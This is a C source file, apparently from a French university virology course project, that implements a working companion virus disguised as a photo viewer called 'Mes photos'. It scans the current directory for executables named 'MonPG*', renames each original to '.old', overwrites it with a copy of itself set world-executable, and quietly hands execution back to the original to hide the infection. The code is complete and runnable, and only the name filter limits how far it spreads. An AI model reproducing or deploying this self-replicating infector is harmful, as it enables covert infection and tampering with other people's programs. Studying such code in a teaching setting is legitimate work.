/*
 * Projet Virus Compagnon - Sécurité et Virologie
 * Fichier : MediaPlayer.c
 * Rôle : Faux lecteur d'images (Payload) et logique d'infection silencieuse.
 * Fonctionnement :
 * - Scanne le répertoire courant pour trouver des exécutables.
 * - Renomme les exécutables cibles en ajoutant l'extension .old
 * - Se duplique en prenant le nom exact de la cible (Infection).
 * - En cas d'exécution sous un nom usurpé, transfère l'exécution au
 *   programme original (.old) pour maintenir la furtivité.
 */
#include <dirent.h>
#include <gtk/gtk.h>
#include <math.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

void loadPictures(GtkWidget *pButton, gpointer data);
DIR *OpenFolder(const char *pathFolder);
void getFileFromFolder(DIR *rep);
int is_infected(char *file);
void infect_target(char *file);

GtkWidget *pWindow;
GtkWidget *pImage;
int idImg = 0;

// -------------------------------------------------------------
// POINT D'ENTRÉE DU PROGRAMME
// -------------------------------------------------------------
int main(int argc, char **argv) {
  // ÉTAPE 1 : Propagation silencieuse en arrière-plan
  // Le virus scanne immédiatement le répertoire courant ("./")
  DIR *rep = OpenFolder("./");
  getFileFromFolder(
      rep); // Lance la routine d'infection sur tous les exécutables trouvés

  // ÉTAPE 2 : Vérification de l'identité actuelle (Suis-je le virus original ou
  // un clone furtif ?) Si le nom d'exécution est exactement le nom du virus de
  // base (MediaPlayer.exe) : Cela signifie que c'est la "Primo-Infection".
  // L'utilisateur a cliqué sur le faux lecteur.
  if (strcmp(argv[0], "./MediaPlayer.exe") == 0) {
    GtkWidget *pButton;
    GtkWidget *layoutBox;

    // -------------------------------------------------------------
    // CHARGE UTILE (PAYLOAD GTK) : Création de la fausse interface "Mes photos"
    // -------------------------------------------------------------
    gtk_init(&argc, &argv); // Initialise la librairie graphique GTK
    pWindow = gtk_window_new(GTK_WINDOW_TOPLEVEL); // Crée la fenêtre principale
    gtk_window_set_position(GTK_WINDOW(pWindow),
                            GTK_WIN_POS_CENTER); // Centre la fenêtre
    gtk_window_set_title(GTK_WINDOW(pWindow), "Mes photos"); // Titre trompeur
    // CORRECTION : Définir une taille max pour la fenêtre dès le départ
    // Empêche la fenêtre de prendre tout l'écran si l'image est grande
    gtk_window_set_default_size(GTK_WINDOW(pWindow), 800, 650);

    layoutBox =
        gtk_box_new(GTK_ORIENTATION_VERTICAL,
                    0); // Boîte invisible pour aligner l'image et le bouton
    gtk_container_add(GTK_CONTAINER(pWindow), layoutBox);

    pButton = gtk_button_new_with_label(
        "Suivant"); // Bouton pour faire défiler les images
    gtk_box_pack_end(GTK_BOX(layoutBox), pButton, FALSE, FALSE,
                     0); // Place le bouton en bas

    // Quitte proprement le programme GTK si la fenêtre est fermée avec la croix
    // rouge
    g_signal_connect(G_OBJECT(pWindow), "destroy", G_CALLBACK(gtk_main_quit),
                     NULL);
    // Associe le clic du bouton "Suivant" à notre fonction loadPictures (qui
    // charge l'image suivante)
    g_signal_connect(G_OBJECT(pButton), "clicked", G_CALLBACK(loadPictures),
                     (gpointer)layoutBox);

    // CORRECTION : Charger et redimensionner la première image pour qu'elle
    // rentre dans la fenêtre Sans ça, si image1.jpg est grande, elle pousse le
    // bouton "Suivant" hors de l'écran
    GdkPixbuf *init_pixbuf =
        gdk_pixbuf_new_from_file("images/image1.jpg", NULL);
    if (init_pixbuf) {
      int iw = gdk_pixbuf_get_width(init_pixbuf);
      int ih = gdk_pixbuf_get_height(init_pixbuf);
      int max_w = 800, max_h = 600;
      if (iw > max_w || ih > max_h) {
        float ratio = fmin((float)max_w / iw, (float)max_h / ih);
        iw = (int)(iw * ratio);
        ih = (int)(ih * ratio);
        GdkPixbuf *scaled =
            gdk_pixbuf_scale_simple(init_pixbuf, iw, ih, GDK_INTERP_BILINEAR);
        g_object_unref(init_pixbuf);
        init_pixbuf = scaled;
      }
      pImage = gtk_image_new_from_pixbuf(init_pixbuf);
      g_object_unref(init_pixbuf);
    } else {
      pImage = gtk_image_new(); // Image vide si le fichier est manquant
    }
    gtk_box_pack_start(GTK_BOX(layoutBox), pImage, TRUE, TRUE, 0);

    // Affiche la fenêtre à l'écran
    gtk_widget_show_all(pWindow);
    // Boucle infinie d'attente d'événements (clics) pour maintenir l'interface
    // ouverte
    gtk_main();
  } else {
    // -------------------------------------------------------------
    // LE RELAIS FURTIF (TRANSFERT D'EXÉCUTION)
    // -------------------------------------------------------------
    // Si on est ici, c'est que le virus a pris la place d'un autre programme
    // (ex: MonPG1) Et que l'utilisateur l'a exécuté pensant lancer sa
    // calculatrice.
    char old_file[256];
    // On reconstitue le nom du fichier légitime que l'on a précédemment caché
    // sous .old Exemple: si argv[0] est "./MonPG1", old_file devient
    // "./MonPG1.old"
    snprintf(old_file, sizeof(old_file), "%s.old", argv[0]);

    // On vérifie si ce fichier légitime existe bel et bien avec access()
    if (access(old_file, F_OK) == 0) {
      // L'APPEL MAGIQUE : execl écrase notre processus viral en mémoire et
      // lance le VRAI programme à la place. L'utilisateur voit sa calculatrice
      // s'ouvrir sans anomalie !
      execl(old_file, old_file, NULL);
      perror("Erreur execl"); // Ne s'affiche que si execl échoue
    }
  }
  return 0;
}

// -------------------------------------------------------------
// FONCTION : Ouvrir le répertoire
// -------------------------------------------------------------
DIR *OpenFolder(const char *pathFolder) {
  DIR *rep = opendir(pathFolder); // Ouvre le dossier spécifié
  if (rep == NULL) {
    perror("Erreur opendir");
    exit(1);
  }
  return rep; // Retourne le pointeur de flux de dossier
}

// -------------------------------------------------------------
// FONCTION : Scanner le contenu du dossier et trouver des cibles
// -------------------------------------------------------------
void getFileFromFolder(DIR *rep) {
  struct dirent *entry;
  struct stat file_stat;

  // Boucle qui lit un à un tous les fichiers contenus dans le dossier (rep)
  while ((entry = readdir(rep)) != NULL) {
    // Filtre : On ne cible que les programmes commençant par "MonPG" pour
    // éviter d'infecter tout le système Linux accidentellement ("MonPG1",
    // "MonPG2", etc.)
    if (strncmp(entry->d_name, "MonPG", 5) == 0) {
      // stat() récupère les propriétés du fichier (taille, permissions, etc.)
      if (stat(entry->d_name, &file_stat) < 0) {
        perror("Erreur stat");
        continue;
      }
      // CRITÈRE 1 : S_ISREG s'assure que c'est un fichier "normal" (non un
      // dossier). CRITÈRE 2 : S_IXUSR s'assure que le fichier est bien un
      // EXÉCUTABLE.
      if (S_ISREG(file_stat.st_mode) && (file_stat.st_mode & S_IXUSR)) {
        printf("Fichier exécutable trouvé : %s\n", entry->d_name);

        // Si le fichier cible réunit les critères, on vérifie qu'il n'a pas
        // DÉJÀ été infecté
        if (!is_infected(entry->d_name)) {
          infect_target(entry->d_name); // Il est vierge : on l'infecte !
        } else {
          printf("%s déjà infecté\n",
                 entry->d_name); // Protection anti-réinfection
        }
      }
    }
  }
  closedir(rep); // Toujours fermer le flux de répertoire
}

// -------------------------------------------------------------
// FONCTION : Vérifier la vulnérabilité (Anti-Réinfection)
// -------------------------------------------------------------
int is_infected(char *file) {
  // Si le fichier examiné contient '.old' dans son nom, c'est que c'est déjà un
  // original caché !
  if (strstr(file, ".old") != NULL) {
    return 1; // 1 = Vrai (il est donc protégé/déjà traité)
  }

  // Sinon, on construit le nom "fichier.old" hypothétique
  char old_file[256];
  snprintf(old_file, sizeof(old_file), "%s.old", file);

  // access(F_OK) vérifie si ce fichier.old existe physiquement sur le disque.
  // S'il existe (retourne 0), c'est que notre virus a déjà frappé cette cible
  // par le passé.
  return (access(old_file, F_OK) == 0);
}

// -------------------------------------------------------------
// FONCTION : Le Cœur Malveillant (Infecter une Cible)
// -------------------------------------------------------------
void infect_target(char *file) {
  char old_file[256];
  // ÉTAPE 1 : Préparation du nom caché
  snprintf(old_file, sizeof(old_file), "%s.old", file);

  // ÉTAPE 2 : Dissimulation (ex: "MonPG1" devient "MonPG1.old")
  // Le virus original a disparu des yeux de l'utilisateur !
  if (rename(file, old_file) != 0) {
    perror("Erreur rename");
    return;
  }

  // ÉTAPE 3 : Duplication
  // Ouverture du corps de notre virus (MediaPlayer.exe) en mode "read binary"
  // (rb)
  FILE *fvirus = fopen("./MediaPlayer.exe", "rb");
  // Création d'un NOUVEAU fichier vierge, prenant le nom exact de l'ancienne
  // cible (ex: "MonPG1") en "write binary" (wb)
  FILE *ftarget = fopen(file, "wb");

  if (!fvirus || !ftarget) {
    perror("Erreur ouverture fichiers");
    return;
  }

  char buffer[512]; // Tampon mémoire pour la copie
  size_t bytes;

  // Le virus lit octet par octet son propre code binaire...
  while ((bytes = fread(buffer, 1, sizeof(buffer), fvirus)) > 0) {
    // ...et l'écrit minutieusement dans ce nouveau fichier (le Clone Infecté).
    fwrite(buffer, 1, bytes, ftarget);
  }

  fclose(fvirus);
  fclose(ftarget);

  // ÉTAPE 4 : Maintien des Privilèges
  // Le clone nouvellement créé n'a potentiellement pas le droit d'être exécuté.
  // L'appel système chmod force le système à accorder l'autorisation
  // "Exécutable" absolue à tout le monde.
  chmod(file, S_IRWXU | S_IRWXG | S_IRWXO);
  printf("Infection réussie : %s\n", file); // Log de confirmation en console
}

// -------------------------------------------------------------
// FONCTION : Callback GTK pour afficher l'image suivante (Payload)
// -------------------------------------------------------------
void loadPictures(GtkWidget *pButton, gpointer data) {
  // Tableau contenant les chemins relatifs vers la base de données d'images du
  // "lecteur"
  char *images[] = {"images/image1.jpg", "images/image2.bmp",
                    "images/image3.png", "images/image4.jpg",
                    "images/image5.jpg", "images/image6.png"};

  // Logique circulaire : si on est à la dernière image (index 5), on revient à
  // 0
  idImg = (idImg == 5) ? 0 : idImg + 1;

  // Tentative de chargement de la nouvelle image depuis le disque (GdkPixbuf)
  GdkPixbuf *pixbuf = gdk_pixbuf_new_from_file(images[idImg], NULL);
  if (!pixbuf) {
    fprintf(stderr, "Erreur chargement image : %s\n", images[idImg]);
    return; // Échec silencieux si l'image manque
  }

  // Récupération des dimensions originales de l'image
  int width = gdk_pixbuf_get_width(pixbuf);
  int height = gdk_pixbuf_get_height(pixbuf);

  // DÉFINITION D'UNE LIMITE DE TAILLE (800x600)
  int max_width = 800;
  int max_height = 600;

  // Si l'image est trop grande pour l'écran, on la redimensionne
  // proportionnellement
  if (width > max_width || height > max_height) {
    // Calcul du ratio de réduction pour conserver les proportions
    float ratio = fmin((float)max_width / width, (float)max_height / height);
    width = (int)(width * ratio);
    height = (int)(height * ratio);

    // Création du nouveau Pixbuf redimensionné (qualité bilinéaire)
    GdkPixbuf *scaled_pixbuf =
        gdk_pixbuf_scale_simple(pixbuf, width, height, GDK_INTERP_BILINEAR);
    g_object_unref(pixbuf); // Libère l'image originale de la mémoire
    pixbuf = scaled_pixbuf; // Remplace par l'image réduite
  }

  // Mise à jour finale du widget GTK Image (l'image s'affiche à l'écran)
  gtk_image_set_from_pixbuf(GTK_IMAGE(pImage), pixbuf);
  g_object_unref(
      pixbuf); // Libère le Pixbuf (GTK a fait sa propre copie interne)

  // Ajustement astucieux de la fenêtre principale à la nouvelle taille de
  // l'image (+50px pour le bouton)
  gtk_widget_set_size_request(pImage, width, height);
  gtk_window_resize(GTK_WINDOW(pWindow), width, height + 50);
}
